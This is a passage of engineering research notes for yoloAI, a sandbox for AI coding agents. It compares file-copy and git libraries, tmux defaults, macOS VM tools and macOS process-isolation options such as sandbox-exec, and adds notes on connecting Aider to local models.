| xattrs | **Not supported** — silently dropped | Preserved on Linux |
| Sparse files | **Not supported** — fully materialized at destination | Handled correctly |
| Error handling | Go errors, `OnError` callback for partial failures | Exit code + stderr, all-or-nothing |
| Testability | Can inject `fs.FS`, mock filesystem | Requires real filesystem |

**Key limitations:**
- No xattr support (SELinux labels, macOS resource forks silently dropped).
- No sparse file awareness (sparse files become fully allocated).
- `Specials: true` reads device content via `io.Copy` instead of `mknod` — blocks on most devices.
- Socket handling regression in v1.14.1 on Docker-mounted macOS volumes (issue #173).
- Setting `CopyBufferSize` disables kernel `copy_file_range` optimization (wraps writer, stripping `ReaderFrom` interface).
- No COW fast-path (`FICLONE`/`clonefile`) — attempted and reverted, not in any release.

**Assessment:** The `Skip` callback is genuinely useful (filtering `.git` during copy), and pure-Go portability is cleaner than shelling out. But `cp -rp` works, has zero deps, and handles edge cases (xattrs, sparse files) that the library doesn't. The copy operation is not a pain point today. **Not worth the churn now** — revisit if `Skip` filtering or Windows support becomes needed.

### `go-git` vs `git` CLI

**Library:** [github.com/go-git/go-git](https://github.com/go-git/go-git) (v5)
**Version evaluated:** v5.16.5 (February 2026)
**Stars:** ~7,215 | **License:** Apache-2.0 | **Maintenance:** Active (10 releases in 13 months, 298 contributors)

**Dependencies:** 23 direct dependencies including `go-crypto`, `go-billy`, `gods`, `go-diff`, `ssh_config`, `x/crypto`, `x/net`, `x/sys`, `x/text`. Heavy transitive tree. For comparison, shelling out to git requires zero Go dependencies.

**Notable users:** Gitea, Pulumi, Keybase, FluxCD. Imported by 4,756+ Go modules.

| Operation | `go-git` support | `git` CLI |
|---|---|---|
| `git init` | Full (`PlainInit`) | Full |
| `git add -A` | Full (`AddWithOptions{All: true}`), bug with deleted files fixed Jan 2023 | Full |
| `git commit` | Full (`Worktree.Commit`) | Full |
| `git rev-parse HEAD` | Full (`repo.Head().Hash()`) | Full |
| `git status --porcelain` | Functional equivalent (`Worktree.Status()`) | Full |
| `git diff --binary` | **Not supported.** Binary files detected but produce empty chunks — cannot generate binary diff content | Full |
| `git diff --stat` | Partial — `Patch.Stats()` gives data but no built-in formatter | Full |
| `git diff -- <paths>` | Manual filtering only (iterate `Changes` slice) | Full |
| `git apply` | **Not supported at all** | Full |
| `git apply --check` | **Not supported** | Full |
| `git apply --unsafe-paths --directory=<path>` | **Not supported** | Full |

**Performance:**

| Operation | `go-git` | `git` CLI | Notes |
|---|---|---|---|
| `Status()` (small Node.js project) | 7-8 seconds | <1 second | Hashes all untracked files unnecessarily |
| `Status()` (large frontend project) | 46 seconds | <1 second | No stat caching for untracked files |
| `Add()` in large repo | O(n) per file (calls `Status()` internally) | O(1) per file | Adding N files = O(n^2) |
| Clone (moby/moby, 32k commits) | ~1m20s, 320MB RAM | ~1m20s, 45MB RAM | Same wall time, ~7x more memory |

A recent merge (PR #1747, February 2026) adds mtime/size-based skip for tracked files in `Status()`, mimicking git CLI behavior. Does not fix the untracked files performance problem.

**Key limitations:**
- **No `git apply` at all** — the entire `apply` command is absent. No `--check`, `--unsafe-paths`, or `--directory` equivalents.
- **No binary diff content** — `FilePatch.IsBinary()` detects binary files but `Chunks()` returns empty. Cannot generate `git diff --binary` output.
- **Patches may be malformed** for files without trailing newlines (missing `\ No newline at end of file` marker), making them incompatible with `git apply`.
- **Merge is fast-forward only** — no three-way merge.
- **No stash, rebase, cherry-pick, revert.**
- **Index format limited to v2** — repos with v3/v4 index cannot be read.
- **`file://` transport shells out to git binary anyway** — partially defeats the pure-Go purpose.
- **No git worktree support.**

**Third-party supplement:** [bluekeyes/go-gitdiff](https://github.com/bluekeyes/go-gitdiff) (142 stars, v0.8.1, January 2025) provides patch parsing and application including binary patches, but with strict mode only (no fuzzy matching), no `--unsafe-paths`/`--directory`, and no `--check` dry-run.

**Assessment: No.** go-git is missing `git diff --binary` and `git apply` — both are core to yoloAI's copy/diff/apply workflow. These aren't edge cases; they're the exact operations that make yoloAI's differentiator work. Even for operations it does support (`init`, `add`, `commit`, `status`), it's measurably slower and adds 23 dependencies vs zero. The testability advantage (in-memory repos) doesn't justify the cost when temp-directory-based test helpers already work well. yoloAI already requires Docker, so requiring git on the host is not an additional burden.

### Decision

| Library | Decision | Rationale |
|---|---|---|
| `otiai10/copy` | **Not now** | Works but doesn't solve a real problem. Revisit for `Skip` filtering or Windows support |
| `go-git` | **No** | Missing `git diff --binary` and `git apply` — both core to the copy/diff/apply workflow |

---

## Tmux Defaults Research

yoloAI sandboxes use tmux for agent interaction. Research into common beginner complaints and established "sensible defaults" projects to inform the container's default tmux configuration.

### Top beginner pain points (ranked by frequency across Reddit, HN, dev.to, GitHub issues)

**Tier 1 — nearly universal complaints:**

1. **Mouse scroll doesn't work.** `set -g mouse` is off by default. Scroll wheel does nothing or sends garbage. Single most cited "what the hell?" moment.
2. **Colors broken/garbled.** Mismatch between terminal capabilities and what tmux advertises. Fix: `set -g default-terminal "tmux-256color"` with `terminal-overrides` for true color.
3. **Escape key delay.** tmux waits 500ms after Escape to check for escape sequences. Vim/neovim users experience maddening mode-switch delay. Fix: `set -sg escape-time 0`.
4. **Copy/paste broken.** tmux has its own paste buffer separate from system clipboard. Mouse selection with `mouse on` copies only to tmux buffer. Keyboard copy mode requires learning new keybindings.
5. **Windows start at 0.** 0 key is far right of keyboard, window 0 is far left of status bar. `prefix + 1` goes to the second window.

**Tier 2 — very common:**

6. **Prefix key (Ctrl-b) is awkward.** Uncomfortable hand stretch. Screen veterans expect Ctrl-a.
7. **Split keybindings are cryptic.** `%` for vertical, `"` for horizontal. Most configs rebind to `|` and `-`.
8. **New panes don't preserve working directory.** New pane starts in tmux server's start directory, not current directory.
9. **Status bar is ugly/uninformative.**
10. **Login shell sourced on every pane.** See below.

**Tier 3 — notable:**

11. Scrollback buffer too small (2000 lines default).
12. Status messages disappear too quickly (750ms default).
13. `aggressive-resize` off — multiple clients shrink all windows to smallest.
14. Focus events not forwarded — vim `autoread` doesn't work.
15. `renumber-windows` off — closing window 2 of 3 leaves gap.

### The login shell problem

Tmux launches login shells by default (equivalent to `bash --login`). Every new pane sources `~/.bash_profile`, causing:
- PATH grows with duplicate entries on every pane
- Slow startup from expensive `.bash_profile` operations
- Background processes may spawn multiple times
- Subtle environment corruption

The tmux maintainer considers this intentional (GitHub issue #1937). Fix: `set -g default-command "${SHELL}"` launches non-login interactive shells (only reads `.bashrc`).

Two separate settings interact:
- `default-shell /bin/bash` — which binary to use (needed when `$SHELL` is wrong, e.g., in Docker containers where it may point to `/bin/sh`)
- `default-command "${SHELL}"` — how to launch it (without `-l`, so non-login)

Most Linux users only need the second. Both are needed in containers or when `$SHELL` is misconfigured.

### Established "sensible defaults" projects

**tmux-sensible** (tmux-plugins/tmux-sensible): "Basic settings everyone can agree on." Philosophy: only fill gaps, never override existing settings. Sets: `escape-time 0`, `history-limit 50000`, `display-time 4000`, `status-interval 5`, `default-terminal screen-256color`, `focus-events on`, `aggressive-resize on`.

**Oh My Tmux** (gpakosz/.tmux): Complete configuration framework. Much heavier — full theme, dual prefix, vim-style navigation, mouse toggle, copy-mode with vi bindings. More than we need but validates the importance of sane defaults.

**Community consensus "sane defaults"** across dozens of blog posts and gists converges on a remarkably consistent set: `mouse on`, `escape-time 0`, `base-index 1`, `history-limit 50000`, `default-terminal tmux-256color`, `renumber-windows on`, `default-command "${SHELL}"`.

### Recommendations for yoloAI container

Ship sensible defaults that fix Tier 1-2 complaints. Skip keybinding changes (prefix, splits) — those are personal preference, not fixes.

| Setting | Value | Fixes |
|---|---|---|
| `mouse` | `on` | #1: scroll, click, resize |
| `escape-time` | `0` | #3: vim escape delay |
| `default-terminal` | `tmux-256color` | #2: color support |
| `base-index` | `1` | #5: keyboard-layout match |
| `pane-base-index` | `1` | #5: same |
| `history-limit` | `50000` | #11: adequate scrollback |
| `default-command` | `${SHELL}` | #10: non-login shell |
| `renumber-windows` | `on` | #15: no gaps |
| `display-time` | `4000` | #12: readable messages |
| `focus-events` | `on` | #14: vim autoread |
| `set-clipboard` | `on` | #4: system clipboard via OSC 52 |

Keybinding changes (prefix, splits, pane navigation) deliberately excluded — they're preference, not fixes, and would conflict with power user muscle memory.

### Sources

- [tmux-plugins/tmux-sensible](https://github.com/tmux-plugins/tmux-sensible) — canonical sensible defaults plugin
- [gpakosz/.tmux](https://github.com/gpakosz/.tmux) — comprehensive config framework
- [tmux issue #1937](https://github.com/tmux/tmux/issues/1937) — maintainer position on login shell default
- [tmux FAQ (official wiki)](https://github.com/tmux/tmux/wiki/FAQ) — TERM/color guidance
- [Prevent Tmux from Starting a Login Shell (Nick Janetakis)](https://nickjanetakis.com/blog/prevent-tmux-from-starting-a-login-shell-by-default) — login shell explanation

---

## macOS VM Sandbox Research

### Context

yoloAI uses Linux Docker containers as disposable sandboxes. macOS-native development (xcodebuild, Swift, Xcode SDKs) cannot run in Linux containers. This section evaluates macOS VM solutions as an alternative sandbox backend for Apple Silicon Macs.

### Apple macOS SLA Virtualization Terms

- Up to **2 additional macOS instances** allowed per Apple-branded computer already running macOS.
- Permitted purposes: software development, testing, macOS Server, personal use.
- Must run on Apple hardware. Non-Apple hardware is a license violation.
- **Hard 2 concurrent macOS VM limit** enforced at the Virtualization.framework level (XNU kernel). Applies to all tools built on Virtualization.framework. Cannot be worked around without unsupported kernel modification.

### Tool Evaluation

#### Tart (Cirrus Labs) — Recommended

**License:** Fair Source (free under 100 CPU cores). **Stars:** ~5,000. **Latest:** v2.31.0 (Feb 2026).

- Full CLI: `tart create`, `clone`, `run`, `stop`, `delete`, `suspend`, `exec`, `pull`, `push`.
- `tart exec` runs commands inside VM via gRPC guest agent (no SSH needed).
- `tart clone` uses APFS copy-on-write (instant, no extra disk until divergence).
- OCI registry push/pull for image distribution.
- VirtioFS directory sharing via `--dir` flag.
- ~15s cold boot, ~5s resume from suspend.
- Active development, regular releases.

**Assessment:** Best fit for yoloAI. CLI maps closely to Docker workflow. APFS clone enables disposable VMs. `tart exec` provides Docker-exec-like functionality. Free for personal use.

#### Anka (Veertu) — Alternative

**License:** Proprietary commercial. Free "Anka Develop" tier (single VM, laptops only). Paid tiers for CI/enterprise (contact sales).

- `anka run` is explicitly Docker-like: mounts CWD, executes command, returns exit code.
- `anka run -v /host/path:/vm/path` for volume mounts.
- Instant shadow-copy clones. ~5s from suspend, ~25s cold boot.
- REST API via Anka Build Cloud for fleet management.

**Assessment:** Most Docker-like interface (`anka run`), but proprietary licensing and opaque pricing. Best for users who already have Anka infrastructure.

#### Parallels Desktop

**License:** Commercial, $120+/yr subscription.

- `prlctl exec` for command execution. `prlctl clone`, `prlctl snapshot`.
- Snapshot support for macOS guests (PD 20+).
- Well-documented CLI.

**Assessment:** Feature-complete but expensive. Impractical as a required dependency for an open-source tool.

#### UTM

**License:** Apache 2.0 (open source). **Stars:** ~33,000.

- `utmctl` CLI is limited (list, start, stop, suspend only).
- No `exec` equivalent. No programmatic VM creation from CLI.
- GUI-oriented design.

**Assessment:** Popular but wrong fit. Lacks the CLI depth for programmatic sandbox management.

#### Not Applicable

- **Lima:** Linux guests only. Cannot run macOS.
- **OrbStack:** Linux containers and VMs only.
- **Docker on macOS:** Cannot run macOS containers. Docker-OSX requires Linux KVM (not available on macOS).

### Emerging Projects (2025-2026)

- **Apple Containerization Framework** (WWDC 2025): Open source. Sub-second Linux container startup on macOS 26+. Linux guests only — not applicable for macOS sandboxing, but could replace Docker for yoloAI's existing Linux sandbox backend.
- **VibeBox** / **Vibe**: Open source Rust tools for LLM agent sandboxing. Linux guests only. Validate that the "VM sandbox for AI agents" space is active.
- **VirtualBuddy**: Open source macOS VM manager. GUI-only, no CLI. Not suitable for programmatic use.
- **Code-Hex/vz**: Go bindings for Apple's Virtualization.framework. Could be used to build a native macOS VM backend without shelling out to Tart, but reimplements what Tart already provides.

### Key Findings

1. **2-VM concurrent limit is inescapable.** Kernel-enforced on Apple Silicon. Users can run at most 2 macOS sandboxes simultaneously per Mac.
2. **No macOS "container" equivalent exists.** Unlike Linux where containers provide sub-second isolation, macOS sandboxing requires full VMs with 5-25 second startup times.
3. **Tart is the strongest candidate** for yoloAI. Complete CLI, `tart exec` (gRPC agent), APFS cloning, OCI image distribution, free for personal use.
4. **The LLM agent sandbox space is active** but all current projects (Vibe, VibeBox) use Linux guests. macOS guest support would be novel.
5. **Apple SLA allows this use case** (development/testing on Apple hardware, up to 2 VMs). Service bureau / time-sharing use is prohibited.

### Comparison Matrix

| Tool | macOS Guest | CLI/Exec | Snapshots | Clone/Reset | Dir Sharing | Startup | License |
|------|:-----------:|:--------:|:---------:|:-----------:|:-----------:|:-------:|---------|
| Tart | Yes | `tart exec` (gRPC) | Suspend only | APFS CoW | VirtioFS | ~5-15s | Fair Source |
| Anka | Yes | `anka run` | Yes | Shadow copy | Auto-mount | ~5-25s | Proprietary |
| Parallels | Yes | `prlctl exec` | Yes (PD 20+) | `prlctl clone` | Shared folders | ~15s | $120+/yr |
| UTM | Yes | Limited | QEMU only | Manual | VirtioFS | ~15-20s | Apache 2.0 |
| Lima | No | N/A | N/A | N/A | N/A | N/A | Apache 2.0 |
| OrbStack | No | N/A | N/A | N/A | N/A | N/A | Commercial |


## macOS Process and Filesystem Isolation Technologies

Research into native macOS isolation mechanisms that could provide container-like or jail-like process isolation without a full VM. Motivated by the question: can we offer a lightweight, fast isolation mode on macOS alongside the existing Tart VM backend?

### Why macOS Lacks Linux-Style Containers

Darwin/XNU has **no namespace support**. Linux containers depend on six namespace types (PID, mount, network, UTS, IPC, user) plus cgroups for resource control. macOS has none of these:

- **No PID namespaces:** All processes share a single PID space.
- **No mount namespaces:** All processes see the same filesystem tree (chroot exists but is blocked by SIP).
- **No network namespaces:** All processes share the same network stack.
- **No user namespaces:** No unprivileged isolation mechanism.
- **No cgroups:** No kernel-level resource control (CPU, memory limits per process group).

This is the fundamental reason Linux-style containers cannot exist on macOS. Every macOS "container" solution either uses VMs (Virtualization.framework) or process-level sandboxing (Seatbelt).

Mach ports have per-task namespaces, but this is an IPC mechanism, not an isolation boundary. POSIX process groups and sessions provide no isolation — they are organizational constructs for signal delivery and terminal control.

### sandbox-exec (Seatbelt / TrustedBSD MAC Framework)

The macOS sandbox system, internally codenamed "Seatbelt," is a policy module for the TrustedBSD Mandatory Access Control (MAC) framework within XNU. The `sandbox-exec` CLI wraps `sandbox_init()` to place a child process into a sandbox defined by a profile.

**Architecture:** Sandbox.kext hooks into MACF at the kernel level. `sandboxd` daemon exposes `com.apple.sandboxd` XPC service. `libsandbox` contains a TinyScheme-based interpreter that compiles SBPL profiles into binary representation for the kernel.

**Profile syntax (SBPL):** Profiles are written in a Scheme dialect. Basic structure:

```scheme
(version 1)
(deny default)                              ; deny everything by default
(allow file-read-data (subpath "/usr/lib"))  ; allow reading /usr/lib
(allow process-exec (literal "/usr/bin/python3"))
(allow network-outbound (remote ip "localhost:*"))
```

Filter types: `(literal "/exact/path")`, `(subpath "/dir")`, `(regex "^/pattern")`, `(remote ip "host:port")`.

Major operation categories (~90 filter predicates as of macOS 15):
- **File:** `file-read*`, `file-write*`, `file-read-metadata`, `file-read-xattr`, `file-write-xattr`
- **Process:** `process-exec`, `process-fork`, `signal`
- **Network:** `network-outbound`, `network-inbound`, `network-bind`
- **Mach IPC:** `mach-lookup`, `mach-register`, `mach-priv*`
- **POSIX IPC:** `ipc-posix-shm*`, `ipc-posix-sem*`
- **System:** `sysctl-read`, `sysctl-write`
- **IOKit:** `iokit-open`, `iokit-set-properties`

The profile language is **not officially documented by Apple** — it is considered an "Apple System Private Interface." Apple's own profiles in `/System/Library/Sandbox/Profiles/` and `/usr/share/sandbox/` serve as the most reliable reference.

Profiles support `(import "profile-name")` for composition and accept runtime parameters via `-D` flag (e.g., `-D HOME=/Users/admin`).

**Deprecation status — critical nuance:**
- **Deprecated:** The public C API (`sandbox_init()`, `sandbox_init_with_parameters()`) since ~macOS 10.12. The `sandbox-exec` man page carries a deprecation notice.
- **NOT deprecated:** The underlying kernel subsystem (Sandbox.kext, MACF hooks). Used by Apple for all system services, App Sandbox enforcement, first-party apps. Will not be removed as long as Apple uses it internally.
- **Practical reality:** The "deprecation" signals Apple's preference for higher-level App Sandbox entitlements. The low-level APIs remain functional on macOS 15 (Sequoia).

**No sandbox nesting.** If a process is already sandboxed and attempts to apply another sandbox, it fails with `sandbox_apply: Operation not permitted`. Child processes inherit the parent's restrictions, but you cannot add a second layer. Tools with built-in sandboxes (Chrome, Swift compiler) fail inside `sandbox-exec`. Workarounds: Chrome's `--no-sandbox`, Swift's `--disable-sandbox`.

**Security strength:** Meaningful boundary but not impenetrable. Primary escape vector is Mach services — sandboxed processes communicate with system services listed in their `mach-lookup` allowlist. Recent CVEs: jhftss uncovered 10+ escape vulnerabilities via Mach services (2024-2025). CVE-2025-31258 (XPC handling in RemoteViewServices). CVE-2025-24277 (`osanalyticshelperd` escape + privesc). CVE-2025-31191 (security-scoped bookmark escape, discovered by Microsoft). Assessment: raises the bar significantly, regularly patched, should not be considered equivalent to VM-level isolation.

**Real-world usage:**
- **Chromium:** Custom `.sb` profiles compiled at runtime via `Seatbelt::Compile`, per-process-type (renderer, GPU, utility, network).
- **OpenAI Codex CLI:** Seatbelt on macOS, Landlock on Linux. Restricts network + limits filesystem writes to workspace.
- **Google Gemini CLI:** Uses `sandbox-exec` for agent isolation.
- **Anthropic sandbox-runtime:** npm package wrapping `sandbox-exec` with dynamically generated profiles, glob-pattern filesystem rules, violation monitoring.

Sources: [Chromium Mac Sandbox V2](https://chromium.googlesource.com/chromium/src/+/HEAD/sandbox/mac/seatbelt_sandbox_design.md), [sandbox-exec overview](https://jmmv.dev/2019/11/macos-sandbox-exec.html), [HackTricks macOS Sandbox](https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/index.html), [jhftss sandbox escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), [Codex sandbox-exec issue](https://github.com/openai/codex/issues/215), [Anthropic sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime), [CVE-2025-31191](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)

### Other Native Isolation Mechanisms

**chroot:** Exists on macOS but **blocked by SIP**. Even with SIP disabled: root can trivially escape via `fchdir()`, no network/IPC/process isolation, requires root. Not viable.

**App Sandbox (entitlements-based):** Not App Store-only — any signed binary can use it. But designed around Apple's container model (`~/Library/Containers/<bundle-id>/`). Cannot specify arbitrary filesystem paths, insufficient granularity for dynamic agent sandboxing, requires code-signing. Wrong abstraction.

**MAC Framework (MACF):** The kernel infrastructure underneath Seatbelt. Ships policy modules: Sandbox.kext, AMFI, Quarantine.kext, ALF.kext, TMSafetyNet.kext. Custom MACF policies require kernel extensions, blocked by SIP. Not usable by third parties.

**XPC/launchd sandboxing:** launchd plists can specify `SandboxProfile` key. Designed for long-lived services with static configs, not ephemeral per-task sandboxing. Awkward fit.

### Third-Party Tools

**[Anthropic sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime):** Early research preview. Dynamically generates Seatbelt profiles on macOS, bubblewrap + Landlock + seccomp on Linux. Glob-pattern filesystem rules, mandatory deny paths for sensitive files, violation monitoring. Used by Claude Code.

**[SandVault](https://github.com/webcoyote/sandvault):** Runs AI agents in a separate macOS user account combined with `sandbox-exec`. User-level filesystem isolation + Seatbelt. Key limitation: no nested sandboxes, so Swift compiler and other self-sandboxing tools fail.

**[MacBox](https://github.com/srdjan/macbox):** Git worktrees for code isolation + `sandbox-exec` for process sandboxing. "Friendly" sandbox: network and subprocess allowed, file writes restricted to worktree and temp dirs.

**[Alcoholless (alcless)](https://github.com/AkihiroSuda/alcless):** By Akihiro Suda (rootless Docker author). Runs commands as a separate macOS user via `sudo`/`su`/`pam_launchd`/`rsync`. Copies working directory, runs isolated, syncs back. Simple and robust but user-level isolation only (no network or Mach port restriction).

**[OSXIEC](https://github.com/Okerew/osxiec):** Experimental native Docker-like solution. APFS disk images, user/group ID isolation, VLANs. SIP-compatible. Intended as quick testing tool, not production runtime.

**firejail / bubblewrap:** Neither has a macOS port. Both depend on Linux namespaces and seccomp.

### Apple Containerization (macOS 26)

First-party container runtime announced WWDC 2025. Open-source, Swift, Apple Silicon optimized. Runs OCI-compliant Linux containers, each in its own lightweight VM via Virtualization.framework (unlike Docker Desktop's single shared VM).

Benchmarks (RepoFlow, M4 Mac mini, Apple Container v0.6.0 vs Docker Desktop v4.47.0):

| Metric | Apple Container | Docker Desktop |
|---|---|---|
| Cold start | 0.92s | 0.21s |
| CPU (1 thread) | 11,080 events/s | 10,940 events/s |
| CPU (all threads) | 55,416 events/s | 53,882 events/s |
| Memory throughput | 108,588 MiB/s | 81,634 MiB/s |
| Idle overhead | Very low | High |

Slower cold start (boots VM per container) but better CPU/memory throughput. Uses EXT4 on block device (not VirtioFS). Requires macOS 26 Tahoe for full functionality, Apple Silicon. No Compose equivalent, early-stage tooling.

**Linux guests only** — cannot run macOS containers. Relevant as a potential replacement for Docker in yoloAI's Linux sandbox backend, not for macOS sandboxing.

Sources: [WWDC 2025](https://developer.apple.com/videos/play/wwdc2025/346/), [Apple Containerization GitHub](https://github.com/apple/containerization), [RepoFlow benchmarks](https://www.repoflow.io/blog/benchmarking-apple-containers-vs-docker-desktop), [The New Stack comparison](https://thenewstack.io/apple-containers-on-macos-a-technical-comparison-with-docker/)

### Feasibility Assessment

| Technology | FS Isolation | Network Isolation | Security | Root | SIP OK | Complexity |
|---|---|---|---|---|---|---|
| sandbox-exec | Good (path-level) | Partial (localhost vs all) | Medium | No | Yes | Low-Medium |
| User account + sandbox-exec | Good | Partial | Medium-High | Yes | Yes | Medium |
| App Sandbox | Poor (container model) | Yes | Medium | No | Yes | Medium |
| chroot | Weak | None | Very Low | Yes | **No** | Low |
| MACF custom policy | N/A | N/A | N/A | N/A | **No** | N/A |
| Virtualization.framework VM | Strong | Strong | Very High | No | Yes | High |
| Apple Containerization | Strong (per-container VM) | Strong | Very High | No | Yes | Medium |
| Tart VM | Strong | Strong | Very High | No | Yes | Medium-High |

### Key Findings

1. **sandbox-exec is the only viable lightweight option.** No root, SIP-compatible, path-level filesystem isolation, partial network control. Used by Codex CLI, Gemini CLI, and Claude Code's own sandbox-runtime.
2. **The nesting limitation is critical but manageable for Claude Code.** sandbox-exec cannot nest — a process already inside a sandbox that tries to apply another gets `sandbox_apply_container: Operation not permitted`. Claude Code's permissions and sandboxing are independent systems: `--dangerously-skip-permissions` controls permission prompts (maps to `bypassPermissions` mode), while sandbox-exec is controlled by `sandbox.enabled` in settings, which **defaults to `false`**. So in the default configuration, Claude Code does not apply sandbox-exec to bash commands — no nesting conflict. If a user has explicitly enabled `sandbox.enabled: true`, yoloAI should inject a settings override to disable it (the outer sandbox-exec provides the isolation). The Linux-only `enableWeakerNestedSandbox` setting does not help on macOS.
3. **Network filtering is coarse.** sandbox-exec can allow all outbound traffic or restrict to localhost only. Cannot whitelist specific remote hosts (e.g., allow `api.anthropic.com` but block everything else). For fine-grained network control, a proxy sidecar or VM is needed.
4. **"Deprecated" is misleading.** Apple uses Seatbelt for everything. The deprecation notice is about the public API, not the subsystem. Functionally stable on macOS 15.
5. **Apple Containerization is the long-term play** for Linux guests. Once macOS 26 is widely deployed, it could replace Docker as yoloAI's Linux container backend with better performance and per-container VM isolation.
6. **No macOS-native container solution exists or is planned.** For running macOS guests in isolation, Tart VMs remain the only option. Apple Containerization is Linux-only.

## Aider Local-Model Integration

Aider supports local model servers via environment variables and model name conventions.

**Ollama:** Set `OLLAMA_API_BASE=http://host.docker.internal:11434` and use model format `ollama_chat/<model>` (e.g., `ollama_chat/llama3`). `host.docker.internal` resolves to the host on macOS and Windows Docker Desktop. On Linux, `--add-host=host.docker.internal:host-gateway` is needed (future enhancement).

**Other local servers:** LM Studio, vLLM, and llama.cpp's server all expose OpenAI-compatible APIs. Aider connects via `OPENAI_API_BASE` pointed at the local endpoint, with `OPENAI_API_KEY` set to any non-empty value (local servers don't validate keys).

**Network considerations:** Local model servers run on the host. Containers reach the host via `host.docker.internal` (macOS/Windows) or `--add-host` (Linux). Network-isolated sandboxes (`--network-none`) cannot reach local servers — this is by design. Future profile support could add `--add-host` configuration.

**Profile vision:** A "local-models" profile would bundle:
- `env` entries for model server URLs
- Network configuration for host access
- Optional Dockerfile additions for model-specific dependencies
